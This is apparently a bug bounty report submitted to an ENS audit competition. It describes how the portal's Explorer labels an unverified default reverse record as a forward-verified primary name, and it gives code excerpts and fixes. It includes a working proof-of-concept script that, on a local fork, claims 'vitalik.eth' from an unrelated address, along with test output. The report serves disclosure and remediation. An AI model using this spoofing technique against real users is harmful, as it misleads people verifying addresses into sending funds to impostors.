# 89441 w a insight explorer certifies an unverified reverse record as a forward verified primary name

**Submitted on Aug 19th 2026 at 11:30:50 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89441
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

The Explorer's address view reads the ENSIP-19 `default.reverse` record with ensjs `getName(..., { allowMismatch: true })`. That flag exists for one purpose: to return a reverse record whose forward verification failed. Without it the call returns `null`. The app keeps the name and drops the `match` verdict that came with it.

Two layers down, the reverse-resolution table hard codes a green `Forward match: True` badge and a `Primary name` badge for exactly that case, and `computeDisplayNameState` returns `isPrimaryName: true`.

The L1 `DefaultReverseRegistrar` is keyed on `msg.sender` and applies no ownership check to the name. Any EOA can spend one transaction claiming any registered ENS name, and the Explorer then states, on its own domain, with a check mark, that the caller's address is the verified primary name of that name.

Forward verification is the only thing binding a reverse record to a name. Here it is skipped and then reported as having passed. On the same table, for the same name and the same address, the Default row correctly reports `False`.

## Root cause

### 1. The verification verdict is fetched and discarded

`apps/portal/src/features/reverse-resolution/hooks/useReverseResolution.ts:236-241`

```tsx
const defaultResult = await getName(l1Client, {
  address,
  coinType: DEFAULT_EVM_COIN_TYPE,
  allowMismatch: true,
})
const defaultName = defaultResult?.name ?? null   // `.match` dropped

return ok(resolvedResults.map((r) => ({ ...r, defaultName })))
```

ensjs semantics, from the pinned build `@ensdomains/ensjs@e96662c`, `src/actions/public/getName.ts`:

```tsx
const errorArgs = parseReverseAddressMismatchError(error)
if (Array.isArray(errorArgs)) {
  unnormalisedName = errorArgs[0]
  if (allowMismatch) {
    match = false
  } else {
    return null
  }
}
```

Passing `allowMismatch: true` and ignoring `match` is the same as removing the check. The correct handling exists ten lines above in the same file, `getL1ReverseRecord` at `:74-78` and `:103`, which stores `forwardMatch: nameResult?.match ?? false`. `features/profile/hooks/usePrimaryName.ts` and `features/forward-resolution/components/hooks/useReverseMatch.ts` also verify correctly. The default-name path is the one site that does not.

### 2. The missing check is rendered as a passing check

`apps/portal/src/features/reverse-resolution/components/ReverseResolutionTable/columns.tsx:96-107`

```tsx
if (!name && defaultName && canInheritDefault(row.original.coinType)) {
  return (
    <div className="flex flex-row items-center gap-2">
      <Badge variant="outline" className="text-xs">
        <CheckCircle2 className="w-4 h-4" />
        <span>True</span>
      </Badge>
      <Badge variant="outline" className="text-xs">
        <SquareUser className="w-4 h-4" />
        <span>Primary name</span>
      </Badge>
      <Badge variant="outline" className="text-xs">Default</Badge>
    </div>
  )
}
```

`row.original.forwardMatch` is never read on that branch. The name cell at `:54-60` does the same. `apps/portal/src/utils/reverseResolution/computeDisplayNameState.ts:80-83` repeats it:

```tsx
const isInheritingDefault = !name && !!defaultName && !isL1
const isPrimaryName = forwardMatch || isInheritingDefault
```

### 3. Nothing gates the write

`features/reverse-resolution/config.ts:24-34` describes the registrar the app itself writes to: "`setName(string)` sets the caller's cross-chain primary name". `ReverseResolutionSidebar.tsx:454` adds: "The reverse registrar's `setName(string)` accepts any UTF-8 string." Confirmed on the fork below: `setName("vitalik.eth")` from an address that owns nothing succeeds for 46,798 gas.

## Impact

Any address can present itself in the Explorer as the verified primary of any registered ENS name, for one transaction of gas. No registration, no name ownership, no homoglyph or unicode trick: the string rendered is the exact, normalized, genuine name.

`/addr/$addr/reverse-resolution` is where a user checks whether an address really belongs to a name. The app does not passively show the record there. It renders a check mark, the words `Forward match: True`, and a `Primary name` badge, which together assert that the ENSIP-3 forward check ran and passed. It never ran. A user verifying a counterparty address this way is told a fabricated binding is genuine, by the application itself, with authentic on-chain data around it and nothing to inspect that would reveal otherwise.

Legitimate users are affected too. `computeDisplayNameState` returns `canSetAsPrimary: false` when inheriting a default, so a user whose L2 primary name is unset or broken is told there is nothing to fix, and the action that would set one is hidden.

## Recommendation

Two changes. The first closes the spoof. The second is needed because the render layer asserts a verification it never performed.

{% stepper %}
{% step %}

### Stop treating an unverified default as a primary name

`useReverseResolution.ts:241`:

```tsx
const defaultName = defaultResult?.match ? defaultResult.name : null
```

If the unverified value is still wanted for display, thread the verdict instead of dropping it, and label it:

```tsx
const defaultName = defaultResult?.name ?? null
const defaultNameVerified = defaultResult?.match ?? false
```

{% endstep %}

{% step %}

### Make the render layer read the verdict

`columns.tsx:96-107` should render the inherited default's real `forwardMatch` rather than a hard coded `True` plus `Primary name`, and `computeDisplayNameState` should take `defaultNameVerified` so `isPrimaryName` becomes `forwardMatch || (isInheritingDefault && defaultNameVerified)`.

That also restores `canSetAsPrimary` for users whose L2 primary name genuinely is not set.
{% endstep %}
{% endstepper %}

Worth adding an invariant test asserting no row can report `forwardMatch: true` without a verified source, so this is not re-lost.

## Known issues

Not listed. EXP-INPUT-005 is validator leniency over homoglyphs, bidi and control characters, with display confusion as its stated impact rather than incorrect resolution; this finding involves no unusual characters at all, the name is the exact normalized string `vitalik.eth`, and no validator is on this code path. QA-06 is a deleted or non-resolving subname still shown as primary, a different mechanism that does not involve `default.reverse` or the `match` flag. WEB-1301 is the address view showing metadata from a name the address genuinely holds; here the binding itself is fabricated and then certified. R2-03 and R2-06 are smart-account session keys, an unrelated subsystem. R2-02 does not apply, nothing is injected.

Distinct from the `packages/smart-account` shared-resolver root grant finding: different asset, on-chain authorization rather than client-side display, and the opposite direction, since there the forward record genuinely is attacker controlled while here the record is correct and the app misreports having verified it. The code path here contains no resolver, role, salt or grant reference.

Distinct from the `apps/manager` raw versus normalized profile finding. That mechanism is two queries keyed on two different name strings resolving to two different nodes. The call at issue here takes no name as input; the lookup key is the address and the name is returned by the chain, so there is no second string to diverge from. Preconditions differ too: that finding requires the attacker to register and own an unnormalized variant, this one requires no registration and no ownership. Applying that finding's fix, a `normalize()` in the record path plus a canonical redirect, leaves both PoCs here passing, because `useReverseResolution.ts` never calls a normalizer. Applying this finding's fix leaves `profileRecords.ts` untouched.

## Proof of Concept

Runs on a local Anvil fork. Nothing is broadcast to a public network.

{% stepper %}
{% step %}

### Start a local fork

```sh
anvil --fork-url <https://ethereum-sepolia-rpc.publicnode.com> --port 8545
```

{% endstep %}

{% step %}

### Run from `apps/portal`

Run this so the workspace's pinned `@ensdomains/ensjs` build resolves:

```sh
cd apps/portal && node poc/default-reverse-spoof.mjs
```

{% endstep %}

{% step %}

### Create `apps/portal/poc/default-reverse-spoof.mjs`

```jsx
// Any EOA can claim any registered ENS name in the ENSIP-19 default reverse
// namespace. Forward verification then fails, and only `allowMismatch: true`
// surfaces the name at all. Runs against a local Anvil fork only.
import {
  BaseError, ContractFunctionRevertedError, createPublicClient,
  createWalletClient, encodeFunctionData, http, parseAbi,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getName } from '@ensdomains/ensjs/public'
import { universalResolverReverseSnippet } from '@ensdomains/ensjs-abi/universalResolver'

const FORK = '<http://127.0.0.1:8545>'

// DefaultReverseRegistrar, pinned by apps/portal/src/features/reverse-resolution/config.ts:34
const DRR = '0x4f382928805ba0e23b30cfb75fc9e848e82dfd47'
// UniversalResolver, from the ensjs Sepolia chain config
const UR = '0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe'
const DEFAULT_COIN = 0x80000000

// A name registered on Sepolia. The attacker owns none of it and never touches it.
const VICTIM_NAME = process.env.POC_NAME ?? 'vitalik.eth'
// Anvil account #1. A plain EOA signing with its own key, holding no roles.
const attacker = privateKeyToAccount('0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d')

const registrarAbi = parseAbi([
  'function setName(string name) returns (bytes32)',
  'function nameForAddr(address addr) view returns (string)',
])

const chain = extendChainWithEns(sepolia)
const transport = http(FORK)
const pub = createPublicClient({ chain, transport })
const wallet = createWalletClient({ chain, transport })

const nameForAddr = () => pub.readContract({ address: DRR, abi: registrarAbi, functionName: 'nameForAddr', args: [attacker.address] })

const reverse = async (coinType) => {
  try {
    const [name] = await pub.readContract({ address: UR, abi: universalResolverReverseSnippet, functionName: 'reverse', args: [attacker.address, BigInt(coinType)] })
    return `OK name=${JSON.stringify(name)}`
  } catch (e) {
    const rv = e instanceof BaseError ? e.walk((x) => x instanceof ContractFunctionRevertedError) : null
    if (rv instanceof ContractFunctionRevertedError) return `REVERT ${rv.data?.errorName ?? rv.signature}(${(rv.data?.args ?? []).map(String).join(', ')})`
    return `REVERT ${e.shortMessage ?? e.message}`
  }
}
const step = (n, label, value) => console.log(`  [${n}] ${label.padEnd(34)} ${value}`)

console.log(`fork: ${FORK}  chainId=${await pub.getChainId()}  block=${await pub.getBlockNumber()}`)
console.log(`\nvictim name : ${VICTIM_NAME}\nattacker    : ${attacker.address}\n`)

await pub.request({ method: 'anvil_setBalance', params: [attacker.address, '0xde0b6b3a7640000'] })

step(0, 'default.reverse BEFORE', JSON.stringify(await nameForAddr()))

const hash = await wallet.sendTransaction({
  account: attacker, chain, to: DRR, gas: 300000n,
  data: encodeFunctionData({ abi: registrarAbi, functionName: 'setName', args: [VICTIM_NAME] }),
})
const rcpt = await pub.waitForTransactionReceipt({ hash })
step(1, 'attacker calls setName', `status=${rcpt.status} gas=${rcpt.gasUsed}`)
step(2, 'default.reverse AFTER', JSON.stringify(await nameForAddr()))
step(3, 'UR.reverse(attacker, 0x80000000)', await reverse(DEFAULT_COIN))

const withFlag = await getName(pub, { address: attacker.address, coinType: DEFAULT_COIN, allowMismatch: true })
const without = await getName(pub, { address: attacker.address, coinType: DEFAULT_COIN })
step(4, 'getName(allowMismatch: true)', JSON.stringify(withFlag))
step(5, 'getName(allowMismatch: false)', JSON.stringify(without))

const confirmed = withFlag?.name === VICTIM_NAME && withFlag?.match === false && without === null
console.log(`\n${confirmed ? 'CONFIRMED' : 'NOT CONFIRMED'}: the attacker's default.reverse names ${VICTIM_NAME}, forward verification fails, and only allowMismatch surfaces it.`)
process.exit(confirmed ? 0 : 1)
```

{% endstep %}

{% step %}

### Expected output

```
fork: <http://127.0.0.1:8545>  chainId=11155111  block=11515203

victim name : vitalik.eth
attacker    : 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

  [0] default.reverse BEFORE             ""
  [1] attacker calls setName             status=success gas=46798
  [2] default.reverse AFTER              "vitalik.eth"
  [3] UR.reverse(attacker, 0x80000000)   REVERT ReverseAddressMismatch(vitalik.eth, 0x)
  [4] getName(allowMismatch: true)       {"name":"vitalik.eth","match":false,"normalized":true,"reverseResolverAddress":null,"resolverAddress":null}
  [5] getName(allowMismatch: false)      null

CONFIRMED: the attacker's default.reverse names vitalik.eth, forward verification fails, and only allowMismatch surfaces it.
```

{% endstep %}
{% endstepper %}

Steps 1 and 2 are the missing ownership check, demonstrated rather than assumed. Step 3 is the UniversalResolver resolving the reverse record to `vitalik.eth`, reading that name's own `addr(0x80000000)` record, finding it does not equal the attacker, and reverting. Steps 4 and 5 are the exact ensjs call the app makes: only the `allowMismatch` variant returns anything, and what it returns is marked `"match": false`. That is the value the app keeps the name from and throws the flag away. The script exits non zero unless all three hold. `POC_NAME` retargets it at any other registered Sepolia name.

{% stepper %}
{% step %}

### Run the Explorer's own code over that state

```sh
pnpm --filter portal vitest run src/features/reverse-resolution/
```

{% endstep %}

{% step %}

### Verify the test output

```
 Test Files  2 passed (2)
      Tests  9 passed (9)
```

{% endstep %}
{% endstepper %}

`apps/portal/src/features/reverse-resolution/unverified-default-primary-name.fork.test.tsx` stubs no chain data. It performs the `setName` itself, then runs the app's real `getReverseResolution` and its real table cell renderers against the fork. Only L1 is forked, so the L2 client is unreachable, which is the same state the attack produces anyway since the attacker writes no per-L2 reverse record. It asserts that the Optimism row comes back with `name: null` and `defaultName: "vitalik.eth"`, that rendering its cells produces `vitalik.eth`, `True` and `Primary name` with no `False` anywhere, and that the Default row on the same table renders `False` and no `Primary name`. Same address, same name, same table, opposite verdicts, because one path consulted the verification result and the other did not.

A fully offline version, no fork and no network, is at `apps/portal/src/features/reverse-resolution/unverified-default-primary-name.poc.test.tsx`.

Both PoC files were checked against the fix: applying `const defaultName = defaultResult?.match ? defaultResult.name : null` flips the exploit assertions in both while the control cases keep passing. No application source is modified in the submitted state.
